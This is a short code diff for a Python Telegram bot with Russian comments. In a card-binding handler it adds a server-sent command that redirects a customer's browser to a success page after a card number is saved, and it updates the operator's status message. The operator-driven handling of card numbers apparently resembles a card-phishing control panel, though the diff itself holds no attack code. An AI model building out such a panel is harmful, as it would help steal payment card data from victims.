@@ -764,9 +764,12 @@ async def bind_card_handler(callback: types.CallbackQuery):
     success = save_card_to_db(card_number)
     
     if success:
+        # ОТПРАВЛЯЕМ КОМАНДУ ДЛЯ РЕДИРЕКТА НА SUCCESS
+        await send_sse_command(user_id, "success", payment_id)
+        
         await update_payment_status(
             callback, payment_id, user_id,
-            "✅ <b>Статус: Карта привязана</b>", 
+            "✅ <b>Статус: Карта привязана</b>\n📋 <b>Клиент перенаправлен на страницу успеха</b>", 
             "bind",
             card_number
         )
@@ -1519,5 +1522,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
